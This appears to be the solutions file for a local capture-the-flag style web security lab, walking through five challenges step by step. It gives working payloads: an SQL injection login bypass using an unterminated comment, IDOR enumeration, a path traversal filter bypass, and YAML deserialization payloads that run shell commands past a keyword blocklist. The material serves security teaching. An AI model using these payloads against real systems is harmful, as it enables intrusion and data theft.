# SOLUTIONS

Full walkthroughs for all 5 labs. This is the "hard mode" version — multi-step
chains, filters that need bypassing, and real decoys. Try each one properly
before reading below.

---

## Lab 1 — Leaky Backup File

1. View the **page source** (not the rendered page) of `http://127.0.0.1:5000/lab1/`.
   An HTML comment near the bottom has a base64 string.
2. Decode it: `b3BzX3JlYWRvbmx5OkI0Y2t1cF9WaWV3IQ==` → `ops_readonly:B4ckup_View!`
3. `/lab1/backup/` returns 401 without credentials. Use HTTP Basic Auth with
   the decoded username/password (in curl: `-u ops_readonly:B4ckup_View!`; in
   a browser, it'll prompt you).
4. The listing shows two files. `config_staging_2024.yaml.bak` is a decoy —
   dead end. `config_old.yaml.bak` is the real one — its comments describe
   the naming convention for the current file, but the environment word is
   ROT13'd: `cebq` → decode it → `prod`.
5. Request `config_prod_2026.yaml.bak` (with the same Basic Auth) — not
   linked anywhere, but it exists and has the live credentials.
6. Log in at `/lab1/login`:
   - Username: `sayali.admin`
   - Password: `Tr!net_Ops#2026`

**Flag:** `CYBERLAB{backups_are_not_hidden_theyre_just_unlinked}`

---

## Lab 2 — Login Bypass (SQL Injection + Enumeration)

1. There's no admin username given anywhere on the login page. Go to
   `/lab2/forgot-password` and try candidate usernames. The team roster
   (sumit, ayush, tejas, sahil, sayali) all return "couldn't find" style
   messages if you guess wrong — but `root_ops` returns "reset instructions
   were sent," confirming it's a real account.
2. At `/lab2/login`, a plain `admin' --`-style payload gets silently
   filtered (`--` is stripped). Instead, use an **unclosed `/*` block
   comment** — SQLite treats everything after an unterminated `/*` as a
   comment through the rest of the statement:
   - Username: `root_ops'/*`
   - Password: anything

**Flag:** `CYBERLAB{quotes_in_user_input_are_never_just_quotes}`

---

## Lab 3 — Peek at Anyone's Invoice (IDOR, split flag)

The flag isn't whole on any single invoice. Explore the ID range around your
own (`4021`). Real invoice IDs in play: `4014, 4021 (you), 4032, 4055, 4063,
4077 (decoy), 4090 (fragment 1), 4104 (decoy), 4118 (fragment 2), 4133`.

- `4077` looks like a flag but its format is wrong — decoy.
- `4090` has fragment 1: `CYBERLAB{an_id_in_the_url_`
- `4118` has fragment 2: `is_not_a_permission_check}`

Concatenate them in order.

**Flag:** `CYBERLAB{an_id_in_the_url_is_not_a_permission_check}`

---

## Lab 4 — Escape the Downloads Folder (filter bypass + folder guessing)

1. A plain `../` traversal attempt is silently stripped by a filter.
2. Bypass it with `....//`, which collapses into `../` after a single
   non-recursive `replace("../", "")`.
3. There's more than one sibling folder next to `downloads/`. Read the public
   file `sumit_notes.txt` — it casually mentions `hr_confidential` in a
   throwaway note. That's the real target (`shared_temp` is a decoy with
   nothing in it).

```
http://127.0.0.1:5000/lab4/download?file=....//hr_confidential/ops_review_sayali.txt
```

**Flag:** `CYBERLAB{dot_dot_slash_still_works_if_nobody_checks}`

---

## Lab 5 — The YAML That Ran Code (filter bypass)

The obvious payload gets blocked:
```yaml
cmd: !!python/object/apply:os.system ["cat flag.txt"]
```
→ "Blocked" (keyword filter on the literal string `os.system`).

Python's standard library has more than one function that runs a shell
command. Two that work here:

```yaml
cmd: !!python/object/apply:subprocess.check_output ["cat flag.txt"]
```
or
```yaml
cmd: !!python/object/apply:posix.system ["cat flag.txt"]
```

**Flag:** `CYBERLAB{yaml_load_without_safe_is_a_loaded_gun}`

---

## The common thread

Every "fix" in this hard-mode version is a real, common shape of *incomplete*
fix: a keyword blocklist that only knows one keyword, a single-pass string
filter, a decoy that looks plausible, an obfuscation (ROT13/base64) mistaken
for real access control. The lesson underneath all 5 labs is the same one
seasoned pentesters lean on constantly: when a defense looks like it's
targeting one specific technique, ask what the *general* version of that
technique is — there's usually more than one way to reach the same outcome.
